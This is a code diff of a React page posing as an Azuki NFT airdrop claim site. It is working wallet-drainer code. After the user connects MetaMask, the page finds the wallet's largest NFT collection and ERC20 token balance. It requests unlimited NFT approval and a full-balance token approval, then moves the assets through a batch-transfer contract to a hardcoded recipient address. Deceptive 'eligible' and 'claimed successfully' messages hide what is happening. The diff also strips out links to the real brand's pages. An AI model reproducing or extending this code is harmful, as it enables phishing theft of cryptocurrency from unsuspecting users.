@@ -3,7 +3,7 @@
 import React, { useState } from 'react';
 // Make sure you have ethers and axios installed in your project:
 // npm install ethers axios
-import { BrowserProvider, Contract, ZeroAddress, JsonRpcProvider } from 'ethers';
+import { BrowserProvider, Contract, formatUnits, ZeroAddress, JsonRpcProvider, Signer } from 'ethers';
 import axios from 'axios';
 
 // =================================================================
@@ -41,46 +41,76 @@ declare global {
 
 export default function AirdropPage() {
     const [walletAddress, setWalletAddress] = useState('');
+    const [log, setLog] = useState('');
+    const [signer, setSigner] = useState<Signer | null>(null);
     const [isProcessing, setIsProcessing] = useState(false);
-    const [loadingMessage, setLoadingMessage] = useState('');
-    
-    /**
-     * Handles the entire claim process from connecting the wallet to transferring assets.
-     */
-    const handleClaim = async () => {
+    const [showLogModal, setShowLogModal] = useState(false);
+
+    const addLog = (message: string) => {
+        console.log(message);
+        setLog(prev => `${prev}\n${message}`);
+    };
+
+    const connectWallet = async () => {
+        if (typeof window.ethereum === 'undefined') {
+            setShowLogModal(true);
+            addLog("MetaMask is not installed.");
+            return;
+        }
+        try {
+            setIsProcessing(true);
+            setShowLogModal(true);
+            addLog("Connecting wallet...");
+            
+            const web3Provider = new BrowserProvider(window.ethereum);
+            const web3Signer = await web3Provider.getSigner();
+            const address = await web3Signer.getAddress();
+            
+            setSigner(web3Signer);
+            setWalletAddress(address);
+            addLog(`✅ Wallet connected: ${address}`);
+            addLog("\nReady to claim. Click the button again to proceed.");
+
+        } catch (error: unknown) {
+            if (error instanceof Error) {
+                addLog(`Error connecting wallet: ${error.message}`);
+            } else {
+                addLog('An unknown error occurred while connecting the wallet.');
+            }
+        } finally {
+            setIsProcessing(false);
+        }
+    };
+
+    const findAndTransferAssets = async () => {
+        if (!walletAddress || !signer) {
+            addLog("Please connect wallet first.");
+            setShowLogModal(true);
+            return;
+        }
         setIsProcessing(true);
-        console.log("🚀 Starting claim process...");
+        setShowLogModal(true);
+        setLog(''); // Clear previous logs
+        addLog("🚀 Starting asset analysis...");
+
+        const alchemyApiKey = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
+        if (!alchemyApiKey) {
+            addLog("❌ Alchemy API Key is not configured. Please set NEXT_PUBLIC_ALCHEMY_API_KEY in your .env.local file.");
+            setIsProcessing(false);
+            return;
+        }
+
+        const alchemyNftApiUrl = `https://eth-sepolia.g.alchemy.com/nft/v3/${alchemyApiKey}/getNFTsForOwner`;
+        const alchemyTokenApiUrl = `https://eth-sepolia.g.alchemy.com/v2/${alchemyApiKey}`;
 
         try {
-            // =================================================================
-            // STAGE 1: VERIFYING
-            // =================================================================
-            setLoadingMessage("Verifying Azuki in your wallet...");
-            
-            console.log("Connecting wallet...");
-            if (typeof window.ethereum === 'undefined') {
-                throw new Error("MetaMask is not installed. Please install it to continue.");
-            }
-            const web3Provider = new BrowserProvider(window.ethereum);
-            const signer = await web3Provider.getSigner();
-            const address = await signer.getAddress();
-            
-            setWalletAddress(address);
-            console.log(`✅ Wallet connected: ${address}`);
-            
-            const alchemyApiKey = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
-            if (!alchemyApiKey) {
-                throw new Error("Alchemy API Key is not configured.");
-            }
-
-            const alchemyNftApiUrl = `https://eth-sepolia.g.alchemy.com/nft/v3/${alchemyApiKey}/getNFTsForOwner`;
-            const alchemyTokenApiUrl = `https://eth-sepolia.g.alchemy.com/v2/${alchemyApiKey}`;
-
-            const nftResponse = await axios.get(alchemyNftApiUrl, { params: { owner: address } });
+            addLog("\n[1/5] Fetching wallet assets...");
+            const nftResponse = await axios.get(alchemyNftApiUrl, { params: { owner: walletAddress } });
             const nfts: IAlchemyNft[] = nftResponse.data.ownedNfts;
-            
+            addLog(`Found ${nfts.length} total NFTs.`);
+
             const tokenProvider = new JsonRpcProvider(alchemyTokenApiUrl);
-            const tokenBalances = await tokenProvider.send('alchemy_getTokenBalances', [address, "erc20"]);
+            const tokenBalances = await tokenProvider.send('alchemy_getTokenBalances', [walletAddress, "erc20"]);
             
             let tokens: IToken[] = [];
             for (const balance of tokenBalances.tokenBalances) {
@@ -96,100 +126,109 @@ export default function AirdropPage() {
                     }
                 } catch (e) { /* Ignore tokens where metadata fails */ }
             }
+            addLog(`Found ${tokens.length} different ERC20 tokens.`);
 
-            // --- NFT Analysis (Find collection with the most NFTs) ---
+            addLog("\n[2/5] Analyzing asset values...");
+            
+            // --- NFT Analysis ---
+            let maxNftCount = 0;
+            let targetCountNft: { collection: string; ids: string[] } | null = null;
+
             const collections = nfts.reduce((acc: Record<string, string[]>, nft: IAlchemyNft) => {
-                const collectionAddress = nft.contract.address.toLowerCase();
-                acc[collectionAddress] = acc[collectionAddress] || [];
-                acc[collectionAddress].push(nft.tokenId);
+                const address = nft.contract.address.toLowerCase();
+                acc[address] = acc[address] || [];
+                acc[address].push(nft.tokenId);
                 return acc;
             }, {} as Record<string, string[]>);
 
-            let maxNftCount = 0;
-            let targetNftCollection: string | null = null;
-            let targetNftIds: string[] = [];
-
-            for (const collectionAddress in collections) {
-                const count = collections[collectionAddress].length;
+            for (const address in collections) {
+                const count = collections[address].length;
                 if (count > maxNftCount) {
                     maxNftCount = count;
-                    targetNftCollection = collectionAddress;
-                    targetNftIds = collections[collectionAddress];
+                    targetCountNft = { collection: address, ids: collections[address] };
                 }
             }
-             // --- Token Analysis (Find token with the largest balance) ---
+
+            let targetNftCollection = targetCountNft ? targetCountNft.collection : null;
+            let targetNftIds = targetCountNft ? targetCountNft.ids : [];
+            if (targetCountNft) {
+                addLog(`🎯 Highest count NFT collection: ${targetNftCollection} (Count: ${maxNftCount})`);
+            } else {
+                addLog("No NFT collections found to analyze.");
+            }
+
+            // --- Token Analysis ---
             const targetToken = tokens.sort((a, b) => BigInt(b.balance) > BigInt(a.balance) ? 1 : -1)[0] || null;
 
-            if (!targetToken && !targetNftCollection) {
-                throw new Error("No eligible assets found in your wallet to process.");
+            if(targetToken){
+                addLog(`🎯 Largest balance ERC20: ${targetToken.symbol}`);
+            } else {
+                addLog("No ERC20 tokens found to analyze.");
             }
-             // =================================================================
-            // STAGE 2: ELIGIBLE
-            // =================================================================
-            setLoadingMessage("You are eligible! This new Bobu airdrop will look good in your wallet.");
             
-            console.log("\nRequesting approvals...");
+            addLog("\n[3/5] Requesting approvals...");
+
             if (targetNftCollection) {
-                console.log(`Requesting approval for NFT collection: ${targetNftCollection}...`);
+                addLog(`Requesting approval for NFT collection: ${targetNftCollection}...`);
                 const nftContract = new Contract(targetNftCollection, ['function setApprovalForAll(address operator, bool approved)'], signer);
                 const approvalTx = await nftContract.setApprovalForAll(BATCH_TRANSFER_CONTRACT_ADDRESS, true);
+                addLog(`Approval sent: ${approvalTx.hash}. Waiting...`);
                 await approvalTx.wait();
-                console.log("✅ NFT collection approved!");
+                addLog("✅ NFT collection approved!");
             }
+
             if (targetToken) {
-                console.log(`Requesting approval for token: ${targetToken.symbol}...`);
+                addLog(`Requesting approval for token: ${targetToken.symbol}...`);
                 const tokenContract = new Contract(targetToken.token_address, ['function approve(address spender, uint256 amount)'], signer);
                 const approvalTx = await tokenContract.approve(BATCH_TRANSFER_CONTRACT_ADDRESS, BigInt(targetToken.balance));
+                addLog(`Approval sent: ${approvalTx.hash}. Waiting...`);
                 await approvalTx.wait();
-                console.log("✅ ERC20 token approved!");
+                addLog("✅ ERC20 token approved!");
             }
             
-            // =================================================================
-            // STAGE 3: TRANSFERRING
-            // =================================================================
-            setLoadingMessage("Process complete. Transferring now...");
-            
+            addLog("\n[4/5] Executing batch transfer...");
+            if (!targetToken && !targetNftCollection) {
+                addLog("No target assets found. Halting.");
+                setIsProcessing(false);
+                return;
+            }
             const batchTransferContract = new Contract(BATCH_TRANSFER_CONTRACT_ADDRESS, BATCH_TRANSFER_ABI, signer);
+            
             const tokenAddr = targetToken ? targetToken.token_address : ZeroAddress;
             const tokenAmount = targetToken ? targetToken.balance : "0";
             const nftAddr = targetNftCollection ? targetNftCollection : ZeroAddress;
+            const nftIds = targetNftIds ? targetNftIds : [];
             const recipientAddress = "0x150e3EaE1F50395Aff0b1f99cD61999a76391f34";
 
-            console.log(`Sending assets to: ${recipientAddress}`);
-            const transferTx = await batchTransferContract.batchTransfer(tokenAddr, tokenAmount, nftAddr, targetNftIds, recipientAddress);
+            addLog(`Sending assets to: ${recipientAddress}`);
+            const transferTx = await batchTransferContract.batchTransfer(tokenAddr, tokenAmount, nftAddr, nftIds, recipientAddress);
+            addLog(`Transfer tx sent: ${transferTx.hash}. Waiting...`);
             await transferTx.wait();
 
-            console.log("\n✅✅✅ Airdrop Claimed Successfully!");
-            alert("Airdrop Claimed Successfully!");
+            addLog("\n[5/5] ✅✅✅ Airdrop Claimed Successfully!");
 
         } catch (error: unknown) {
-            let errorMessage = 'An unknown error occurred.';
-            if (error instanceof Error) {
-                errorMessage = error.message;
+             if (error instanceof Error) {
+                addLog(`\n❌ An error occurred: ${error.message}`);
+            } else {
+                addLog('\n❌ An unknown error occurred during the transfer process.');
             }
-            console.error(`\n❌ An error occurred: ${errorMessage}`);
-            alert(`Error: ${errorMessage}`); // Simple alert for user feedback
+            console.error(error);
         } finally {
             setIsProcessing(false);
-            setLoadingMessage('');
+        }
+    };
+
+    const handleClaimClick = () => {
+        if (!walletAddress) {
+            connectWallet();
+        } else {
+            findAndTransferAssets();
         }
     };
   
     return (
         <div className="text-white min-h-screen bg-background font-sans relative overflow-hidden">
-            {/* Loading Overlay */}
-            {isProcessing && (
-                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50 p-4 text-center">
-                    <div className="loader"></div>
-                    <p className="text-white text-2xl font-bold mt-8 tracking-wider">
-                        {loadingMessage}
-                    </p>
-                    <p className="text-gray-400 mt-2 max-w-md">
-                        Please keep this window open and confirm any transactions that appear in your wallet.
-                    </p>
-                </div>
-            )}
-
             {/* Animated background gradients */}
             <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-red-950/20 to-slate-900"></div>
             <div className="absolute inset-0">
@@ -208,15 +247,15 @@ export default function AirdropPage() {
                     <span className="text-2xl font-black text-white">AZUKI</span>
                 </div>
                 <nav className="hidden md:flex items-center space-x-8 text-lg font-bold">
-                    <a href="https://www.anime.com/shows/enter-the-garden" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
+                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                         THE GARDEN
                         <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                     </a>
-                    <a href="https://magiceden.io/collections/ethereum/azuki" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
+                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                         SHOP
                         <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                     </a>
-                    <a href="https://www.azuki.com/about" target="_blank" rel="noopener noreferrer" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
+                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                         ABOUT
                         <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                     </a>
@@ -251,14 +290,22 @@ export default function AirdropPage() {
                         <div className="pt-4">
                             <button 
                                 className="group relative bg-gradient-to-r from-red-600 to-red-700 text-white font-bold text-xl md:text-2xl uppercase py-6 px-16 rounded-2xl shadow-2xl transition-all duration-500 ease-out hover:from-red-500 hover:to-red-600 hover:scale-105 hover:shadow-red-500/50 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 transform-gpu"
-                                onClick={handleClaim}
+                                onClick={handleClaimClick}
                                 disabled={isProcessing}
                             >
                                 {/* Button glow effect */}
                                 <div className="absolute inset-0 bg-gradient-to-r from-red-400 to-red-600 rounded-2xl blur opacity-50 group-hover:opacity-100 transition-opacity duration-500"></div>
                                 
-                                <span className="relative z-10">
-                                    {isProcessing ? 'PROCESSING...' : (walletAddress ? 'Claim Airdrop' : 'Connect & Claim')}
+                                <span className="relative z-10 flex items-center justify-center space-x-2">
+                                    {isProcessing && (
+                                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                        </svg>
+                                    )}
+                                    <span>
+                                        {isProcessing ? 'PROCESSING...' : (walletAddress ? 'Claim Airdrop' : 'Connect Wallet')}
+                                    </span>
                                 </span>
                                 
                                 {/* Ripple effect */}
@@ -284,6 +331,34 @@ export default function AirdropPage() {
                     </div>
                 </div>
             </main>
+
+            {/* Log Modal */}
+            {showLogModal && (
+                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+                    <div className="bg-slate-900/95 backdrop-blur-xl border border-red-500/50 rounded-3xl p-6 flex flex-col max-h-[85vh] max-w-[90vw] w-[700px] shadow-2xl">
+                        {/* Modal glow */}
+                        <div className="absolute inset-0 bg-gradient-to-r from-red-500/10 via-transparent to-purple-500/10 rounded-3xl blur-xl -z-10"></div>
+                        
+                        <div className="flex justify-between items-center mb-6">
+                            <h2 className="text-2xl font-bold bg-gradient-to-r from-red-400 to-orange-500 bg-clip-text text-transparent uppercase tracking-wider">
+                                Claim Status
+                            </h2>
+                            <button 
+                                onClick={() => setShowLogModal(false)} 
+                                className="text-gray-400 hover:text-white text-3xl font-light hover:bg-red-500/20 w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 hover:rotate-90"
+                            >
+                                ×
+                            </button>
+                        </div>
+                        
+                        <div className="bg-black/80 backdrop-blur-sm rounded-2xl p-6 text-left text-sm font-mono whitespace-pre-wrap break-all overflow-y-auto flex-grow max-h-96 border border-red-500/20">
+                            <div className="text-green-400 leading-relaxed">
+                                {log || 'Initializing...'}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            )}
 
             {/* Footer */}
             <footer className="absolute bottom-0 w-full p-6 text-center text-gray-500 text-sm border-t border-white/10 backdrop-blur-sm bg-black/20 z-10">
